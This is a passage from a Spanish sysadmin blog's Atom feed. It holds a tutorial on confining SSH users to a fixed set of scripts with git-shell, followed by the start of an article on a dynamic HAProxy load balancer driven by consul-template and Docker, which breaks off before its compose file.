&lt;p&gt;Se puede desactivar indicando puerto 0, pero igual le podéis encontrar una utilidad...&lt;/p&gt;</content><category term="cron"></category><category term="go"></category><category term="go-cron"></category></entry><entry><title>Una jaula SSH con git-shell</title><link href="http://www.linuxsysadmin.ml/2018/05/una-jaula-ssh-con-git-shell.html" rel="alternate"></link><published>2018-05-14T10:00:00+02:00</published><updated>2018-05-14T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-05-14:/2018/05/una-jaula-ssh-con-git-shell.html</id><summary type="html">&lt;p&gt;El otro día recibí una petición en el trabajo por parte de un cliente: poder ejecutar algunas operaciones por SSH en nuestro servidor. Solo de pensar en montar una jaula SSH con los binarios y sus librerías ya se me hizo cuesta arriba, y por eso lo hice con &lt;strong&gt;git-shell …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;El otro día recibí una petición en el trabajo por parte de un cliente: poder ejecutar algunas operaciones por SSH en nuestro servidor. Solo de pensar en montar una jaula SSH con los binarios y sus librerías ya se me hizo cuesta arriba, y por eso lo hice con &lt;strong&gt;git-shell&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;No he encontrado por internet nadie que haya hecho algo similar, así que lo he puesto por escrito en este artículo. Se trata de utilizar el &lt;em&gt;shell&lt;/em&gt; restringido &lt;strong&gt;git-shell&lt;/strong&gt; para que el usuario solo pueda utilizar los &lt;em&gt;scripts&lt;/em&gt; o binarios presentes en la carpeta &lt;code&gt;~/git-shell-commands/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Por defecto, &lt;strong&gt;git-shell&lt;/strong&gt; solo acepta las operaciones necesarias para trabajar remotamente con repositorios &lt;em&gt;git&lt;/em&gt;. Esto se puede leer en &lt;a href="https://git-scm.com/docs/git-shell"&gt;la documentación&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Call the corresponding server-side command to support the client’s git push, git fetch, or git archive --remote request.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Sin embargo, ante la presencia de una carpeta &lt;code&gt;~/git-shell-commands/&lt;/code&gt; también nos añade los &lt;em&gt;scripts&lt;/em&gt; y binarios de la misma al conjunto de operaciones que podemos ejecutar.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If a ~/git-shell-commands directory is present, git shell will also handle other, custom commands by running "git-shell-commands/&lt;command&gt; &lt;arguments&gt;" from the user’s home directory.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Esto está pensado para operaciones administrativas como crear, borrar y modificar los repositorios alojados. Sin embargo, podemos utilizarlo para limitar los comandos que un usuario puede ejecutar, sean o no de &lt;em&gt;git&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Por supuesto, el soporte a operaciones remotas de &lt;em&gt;git&lt;/em&gt; no nos molesta; al no haber repositorios, estas operaciones van a fallar de todas formas. Así pues, vamos a centrarnos en nuestras propias operaciones.&lt;/p&gt;
&lt;h2&gt;Un ejemplo simple&lt;/h2&gt;
&lt;p&gt;Supongamos que tenemos un servidor con SSH, al que vamos a llamar &lt;em&gt;server&lt;/em&gt;. Para la demostración, se va a tratar de un servidor &lt;strong&gt;Alpine Linux&lt;/strong&gt;, aunque esto no es relevante.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: A menos que se diga lo contrario, todos los comandos se ejecutan con &lt;em&gt;root&lt;/em&gt;, aunque podéis usar &lt;em&gt;sudo&lt;/em&gt; con el mismo efecto.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: Las sesiones de SSH a &lt;em&gt;server&lt;/em&gt; responden con el nombre &lt;em&gt;localhost&lt;/em&gt;. Esto es debido a que el servidor es un contenedor &lt;strong&gt;docker&lt;/strong&gt; con el puerto 22 mapeado al puerto 22 del servidor &lt;em&gt;sirius&lt;/em&gt;; al ser un ejemplo, prefiero no virtualizar máquinas nuevas.&lt;/p&gt;
&lt;p&gt;Para disponer del binario &lt;strong&gt;git-shell&lt;/strong&gt;, necesitamos el paquete &lt;strong&gt;git&lt;/strong&gt; instalado. Si no lo tenéis hecho, es el mejor momento para hacerlo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;server:~# apk add --no-cache git
fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/community/x86_64/APKINDEX.tar.gz
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;/6&lt;span class="o"&gt;)&lt;/span&gt; Installing ca-certificates &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;20171114&lt;/span&gt;-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;/6&lt;span class="o"&gt;)&lt;/span&gt; Installing libssh2 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.8.0-r2&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;/6&lt;span class="o"&gt;)&lt;/span&gt; Installing libcurl &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;.59.0-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;/6&lt;span class="o"&gt;)&lt;/span&gt; Installing expat &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.2.5-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;/6&lt;span class="o"&gt;)&lt;/span&gt; Installing pcre2 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.30-r0&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;/6&lt;span class="o"&gt;)&lt;/span&gt; Installing git &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.15.0-r1&lt;span class="o"&gt;)&lt;/span&gt;
Executing busybox-1.27.2-r7.trigger
Executing ca-certificates-20171114-r0.trigger
OK: &lt;span class="m"&gt;20&lt;/span&gt; MiB in &lt;span class="m"&gt;20&lt;/span&gt; packages
server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a crear un usuario para que nuestro cliente pueda entrar por SSH; nada nuevo por el momento, con la excepción de que vamos a indicar como su &lt;em&gt;shell&lt;/em&gt; el mismo &lt;strong&gt;git-shell&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;server:~# adduser -D customer -s /usr/bin/git-shell
server:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;customer:s3cr3t&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; chpasswd
chpasswd: password &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;customer&amp;#39;&lt;/span&gt; changed
server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si el usuario intenta entrar en este punto, solo podrá utilizar las operaciones &lt;em&gt;git&lt;/em&gt; remotas, siendo imposible que lance una sesión interactiva, o comandos sueltos por SSH.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ ssh customer@server
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
customer@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &amp;lt;http://wiki.alpinelinux.org&amp;gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

fatal: Interactive git shell is not enabled.
hint: ~/git-shell-commands should exist and have &lt;span class="nb"&gt;read&lt;/span&gt; and execute access.
Connection to localhost closed.
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ ssh customer@server hostname
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
customer@localhost&lt;span class="s1"&gt;&amp;#39;s password: &lt;/span&gt;
&lt;span class="s1"&gt;fatal: unrecognized command &amp;#39;&lt;/span&gt;hostname&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para activar &lt;strong&gt;git-shell&lt;/strong&gt;, hay que crear la carpeta indicada &lt;code&gt;~/git-shell-commands&lt;/code&gt;; los comandos que se pueden ejecutar son los que van dentro de la misma.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;server:~# &lt;span class="nb"&gt;cd&lt;/span&gt; /home/customer/
server:/home/customer# mkdir git-shell-commands
server:/home/customer# chown customer:customer git-shell-commands/
server:/home/customer# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con esto el usuario ya va a poder entrar en una sesión interactiva, aunque no dispone de comandos para ejecutar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ ssh customer@server
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
customer@localhost&lt;span class="s1"&gt;&amp;#39;s password: &lt;/span&gt;
&lt;span class="s1"&gt;Welcome to Alpine!&lt;/span&gt;

&lt;span class="s1"&gt;The Alpine Wiki contains a large amount of how-to guides and general&lt;/span&gt;
&lt;span class="s1"&gt;information about administrating Alpine systems.&lt;/span&gt;
&lt;span class="s1"&gt;See &amp;lt;http://wiki.alpinelinux.org&amp;gt;.&lt;/span&gt;

&lt;span class="s1"&gt;You can setup the system with the command: setup-alpine&lt;/span&gt;

&lt;span class="s1"&gt;You may change this message by editing /etc/motd.&lt;/span&gt;

&lt;span class="s1"&gt;git&amp;gt; hostname&lt;/span&gt;
&lt;span class="s1"&gt;unrecognized command &amp;#39;&lt;/span&gt;hostname&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;
git&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos faltaría rellenar la carpeta con los binarios o &lt;em&gt;scripts&lt;/em&gt; que este usuario pueda necesitar. Como punto interesante, si existe un &lt;code&gt;help&lt;/code&gt;, este se va a ejecutar al entrar por SSH de forma automática, y nos puede servir para que el usuario sepa que hacer (o para que pida ayuda en el medio de una sesión).&lt;/p&gt;
&lt;p&gt;El resto de comandos son libres y podéis hacer literalmente lo que queráis, con el entendido que estos &lt;em&gt;scripts&lt;/em&gt; pueden invocar todos los comandos del sistema de forma normal, pero  el usuario solo va a poder ejecutar estos &lt;em&gt;scripts&lt;/em&gt;. Veamos un ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;server:/home/customer# &lt;span class="nb"&gt;cd&lt;/span&gt; git-shell-commands/
server:/home/customer/git-shell-commands# cat &lt;span class="nb"&gt;help&lt;/span&gt; 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Permitted commands:&amp;quot;&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;  help - shows this help message&amp;quot;&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;  hostname - shows hostname of this server&amp;quot;&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;  get_connected_users - shows user currently logged on&amp;quot;&lt;/span&gt;
server:/home/customer/git-shell-commands# cat hostname 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

hostname
server:/home/customer/git-shell-commands# cat get_connected_users 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nv"&gt;n&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$RANDOM&lt;/span&gt;
&lt;span class="nb"&gt;let&lt;/span&gt; n%&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Users connected: &lt;/span&gt;&lt;span class="nv"&gt;$n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
server:/home/customer/git-shell-commands# chown customer:customer *
server:/home/customer/git-shell-commands# chmod &lt;span class="m"&gt;755&lt;/span&gt; *
server:/home/customer/git-shell-commands# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora es el momento de que el usuario se conecte y vea el resultado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ ssh customer@server
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
customer@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &amp;lt;http://wiki.alpinelinux.org&amp;gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

Permitted commands:
  &lt;span class="nb"&gt;help&lt;/span&gt; - shows this &lt;span class="nb"&gt;help&lt;/span&gt; message
  hostname - shows hostname of this server
  get_connected_users - shows user currently logged on
git&amp;gt; hostname
server
git&amp;gt; &lt;span class="nb"&gt;help&lt;/span&gt;
Permitted commands:
  &lt;span class="nb"&gt;help&lt;/span&gt; - shows this &lt;span class="nb"&gt;help&lt;/span&gt; message
  hostname - shows hostname of this server
  get_connected_users - shows user currently logged on
git&amp;gt; get_connected_users
Users connected: &lt;span class="m"&gt;4&lt;/span&gt;
git&amp;gt; &lt;span class="nb"&gt;exit&lt;/span&gt;
Connection to localhost closed.
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y de esta forma, el usuario queda limitado, pero con estos 3 comandos posibles.&lt;/p&gt;</content><category term="git"></category><category term="git-shell"></category><category term="jaula"></category><category term="ssh"></category></entry><entry><title>Un balanceador dinámico con consul-template</title><link href="http://www.linuxsysadmin.ml/2018/05/un-balanceador-dinamico-con-consul-template.html" rel="alternate"></link><published>2018-05-07T10:00:00+02:00</published><updated>2018-05-07T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-05-07:/2018/05/un-balanceador-dinamico-con-consul-template.html</id><summary type="html">&lt;p&gt;Aquellos que leéis mis artículos habitualmente ya sabéis lo que es un balanceador de carga, especialmente los de peticiones HTTP; en especial conocemos &lt;strong&gt;nginx&lt;/strong&gt; y &lt;strong&gt;haproxy&lt;/strong&gt;. La parte mala de estos servicios es que la configuración es estática e inmutable, y en un mundo &lt;em&gt;cloud&lt;/em&gt;, eso no es lo ideal …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Aquellos que leéis mis artículos habitualmente ya sabéis lo que es un balanceador de carga, especialmente los de peticiones HTTP; en especial conocemos &lt;strong&gt;nginx&lt;/strong&gt; y &lt;strong&gt;haproxy&lt;/strong&gt;. La parte mala de estos servicios es que la configuración es estática e inmutable, y en un mundo &lt;em&gt;cloud&lt;/em&gt;, eso no es lo ideal.&lt;/p&gt;
&lt;p&gt;En el momento en que pasamos de servidores tradicionales al modelo &lt;em&gt;cloud&lt;/em&gt;, nos damos cuenta que no es importante que el servidor X o el servidor Y funcionen; lo que queremos es &lt;strong&gt;dar un servicio&lt;/strong&gt;, y no nos importan los servidores que sean; incluso podemos aumentar o decrementar su número con facilidad.&lt;/p&gt;
&lt;p&gt;En estos casos, es muy conveniente tener un servicio de &lt;em&gt;discovery&lt;/em&gt;, que nos sepa decir qué servidores tenemos y qué servicios hay alojados en ellos; &lt;strong&gt;Consul&lt;/strong&gt; es uno de ellos, que ya vimos con anterioridad.&lt;/p&gt;
&lt;p&gt;Sin embargo, seguimos teniendo que reconfigurar los balanceadores manualmente y recargando su configuración. Para ello se creó &lt;strong&gt;consul-template&lt;/strong&gt;, que no es más que un proceso que se dedica a construir ficheros de configuración cuando &lt;strong&gt;consul&lt;/strong&gt; le indica que ha habido un cambio relevante; en este momento, &lt;strong&gt;consul-template&lt;/strong&gt; regenerará la configuración del servicio y opcionalmente lanzará un comando indicado.&lt;/p&gt;
&lt;p&gt;Juntando nuestro servicio de balanceador con &lt;strong&gt;consul-template&lt;/strong&gt; podemos conseguir fácilmente la ilusión de un balancear dinámico: &lt;strong&gt;consul-template&lt;/strong&gt; regenerará la configuración del balanceador y lanzará el comando necesario para que el balanceador la recargue.&lt;/p&gt;
&lt;h2&gt;Un ejemplo: balanceando peticiones web con HAProxy&lt;/h2&gt;
&lt;p&gt;Como decisión de diseño, y para simplificar vamos a ver el siguiente escenario:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Tenemos un servidor web en &lt;em&gt;localhost:8001&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Tenemos un servidor web en &lt;em&gt;localhost:8002&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Vamos a exponer en &lt;em&gt;localhost:80&lt;/em&gt; las peticiones, con &lt;strong&gt;HAProxy&lt;/strong&gt; y con un algoritmo de &lt;em&gt;round-robin&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;El balanceador es un contenedor &lt;strong&gt;Docker&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;consul-template&lt;/strong&gt; también ejecuta como un contendor &lt;strong&gt;Docker&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;De hecho, todo esto también sirve para otros servicios, como por ejemplo, &lt;strong&gt;nginx&lt;/strong&gt;.&lt;/p&gt;
&lt;h3&gt;Ejecutando consul&lt;/h3&gt;
&lt;p&gt;Lo primero es ejecutar un proceso &lt;strong&gt;consul&lt;/strong&gt; con los servicios declarados y con sus respectivos &lt;em&gt;checks&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/services/consul$ cat consul.json
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;services&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;port&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;8001&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web2&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;port&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;8002&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;]&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;checks&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;service_id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web1&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;http&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;http://localhost:8001/&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;interval&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;timeout&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web2&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;service_id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web2&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;http&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;http://localhost:8002/&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;interval&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;timeout&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@atlantis:~/projects/services/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es especialmente crítico que ambos servicios y ambos &lt;em&gt;checks&lt;/em&gt; tengan identificadores diferentes, porque sino, &lt;strong&gt;consul&lt;/strong&gt; no los percibe como cosas diferentes.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/services/consul$ ./consul agent -dev --advertise &lt;span class="m"&gt;10&lt;/span&gt;.0.2.15 -client &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0 -config-file consul.json
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Starting Consul agent...
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Consul agent running!
           Version: &lt;span class="s1"&gt;&amp;#39;v1.0.6&amp;#39;&lt;/span&gt;
           Node ID: &lt;span class="s1"&gt;&amp;#39;7d05eed1-f9db-2b02-499f-1bcdb37bf73c&amp;#39;&lt;/span&gt;
         Node name: &lt;span class="s1"&gt;&amp;#39;atlantis&amp;#39;&lt;/span&gt;
        Datacenter: &lt;span class="s1"&gt;&amp;#39;dc1&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Segment: &lt;span class="s1"&gt;&amp;#39;&amp;lt;all&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
            Server: &lt;span class="nb"&gt;true&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Bootstrap: &lt;span class="nb"&gt;false&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
       Client Addr: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.0.0.0&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;HTTP: &lt;span class="m"&gt;8500&lt;/span&gt;, HTTPS: -1, DNS: &lt;span class="m"&gt;8600&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
      Cluster Addr: &lt;span class="m"&gt;10&lt;/span&gt;.0.2.15 &lt;span class="o"&gt;(&lt;/span&gt;LAN: &lt;span class="m"&gt;8301&lt;/span&gt;, WAN: &lt;span class="m"&gt;8302&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
           Encrypt: Gossip: false, TLS-Outgoing: false, TLS-Incoming: &lt;span class="nb"&gt;false&lt;/span&gt;

&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Log data will now stream in as it occurs:
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y lo dejamos funcionado.&lt;/p&gt;
&lt;h3&gt;El balanceador y consul-template&lt;/h3&gt;
&lt;p&gt;El balanceador no tiene ningún misterio; se trata de un &lt;strong&gt;haproxy&lt;/strong&gt; normal y corriente, con la única peculiaridad de que la carpeta &lt;em&gt;/etc/haproxy/&lt;/em&gt; es un volúmen, de forma que el contenedor de &lt;strong&gt;consul-template&lt;/strong&gt; lo pueda exportar y escribir en él. De esta forma podemos "dar un cambiazo" al fichero de configuración desde otro contenedor.&lt;/p&gt;
&lt;p&gt;Estaría bien tener en la imagen del balanceador un &lt;em&gt;script&lt;/em&gt; que supiera como recargar la configuración del balanceador de forma fina y delicada, de forma que el otro contenedor simplemente ejecutaría un &lt;code&gt;docker exec&lt;/code&gt; para "pedirle" que lo hiciera, sin entrar en detalles de como se hace. Para agilizar el artículo, nos limitaremos a hacer un &lt;code&gt;docker restart&lt;/code&gt;, que no es ideal, pero nos vale de momento.&lt;/p&gt;
&lt;p&gt;Por su parte, el contenedor que ejecuta &lt;strong&gt;consul-template&lt;/strong&gt; tampoco tiene ningún misterio. Se limita a exportar la carpeta de configuración de &lt;strong&gt;haproxy&lt;/strong&gt; y ejecutar &lt;strong&gt;consul-template&lt;/strong&gt;, de forma continua y limitándose a crear &lt;code&gt;/etc/haproxy/haproxy.cfg&lt;/code&gt; a partir de la información del &lt;strong&gt;consul&lt;/strong&gt; local y la plantilla suministrada.&lt;/p&gt;
&lt;p&gt;Si se diera el caso de un cambio en el servicio implicado, &lt;strong&gt;consul-template&lt;/strong&gt; regeneraría la configuración de &lt;strong&gt;haproxy&lt;/strong&gt;; como &lt;em&gt;bonus&lt;/em&gt;, va a reiniciar el contenedor de &lt;strong&gt;haproxy&lt;/strong&gt; para que este aplique la nueva configuración. No es la mejor manera de hacer las cosas, pero el "como reinicar un &lt;strong&gt;haproxy&lt;/strong&gt;" no es la parte relevante del artículo.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Para más información de como controlar un contenedor alojado en el mismo &lt;em&gt;host&lt;/em&gt; en que corre el nuestro, podemos seguir &lt;a href="http://www.linuxsysadmin.ml/2018/04/controlando-docker-desde-un-contenedor.html"&gt;este otro artículo&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;El contenedor de &lt;strong&gt;consul-template&lt;/strong&gt; solo tiene lo necesario para usar el comando &lt;code&gt;docker&lt;/code&gt; y el mismo &lt;code&gt;consul-template&lt;/code&gt;. Los añado como referencia:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/balancer$ tree templater_build/
templater_build/
├── consul-template
└── Dockerfile

&lt;span class="m"&gt;0&lt;/span&gt; directories, &lt;span class="m"&gt;2&lt;/span&gt; files
gerard@atlantis:~/projects/balancer$ cat templater_build/Dockerfile
FROM alpine:3.7
RUN apk add --no-cache docker &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/docker-proxy &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/docker-containerd-shim &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/docker-runc &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/docker-containerd-ctr &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/docker-containerd &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/dockerd
COPY consul-template /usr/bin/
gerard@atlantis:~/projects/balancer$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;También añado como referencia el &lt;em&gt;docker-compose.yml&lt;/em&gt; con el que se levantan ambos contenedores.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/balancer$ cat docker-compose.yml
